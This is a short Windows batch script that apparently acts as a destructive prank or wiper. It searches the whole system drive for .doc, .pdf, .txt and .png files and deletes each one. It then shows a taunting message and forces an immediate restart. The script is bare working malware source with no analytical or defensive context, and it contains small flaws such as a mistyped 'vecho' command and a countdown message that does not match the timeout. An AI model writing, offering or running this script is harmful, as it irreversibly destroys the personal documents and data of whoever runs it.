@echo off

REM Delete All Documents
DIR /S/B %SystemDrive%\*.doc >> FIleList_doc.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_doc.txt) do del "%%j:%%k"

REM Delete All Pdf files
DIR /S/B %SystemDrive%\*.pdf >> FIleList_pdf.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_pdf.txt) do del "%%j:%%k"

REM Delete All Text files
DIR /S/B %SystemDrive%\*.txt >> FIleList_txt.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_txt.txt) do del "%%j:%%k"

REM Delete All Png files
DIR /S/B %SystemDrive%\*.png >> FIleList_png.txt
vecho Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_png.txt) do del "%%j:%%k"


echo All your import files have been deleted, You have 2 seconds to close the window before your files are gone forever! 
timeout 5 > NUL
shutdown.exe /r /t 00
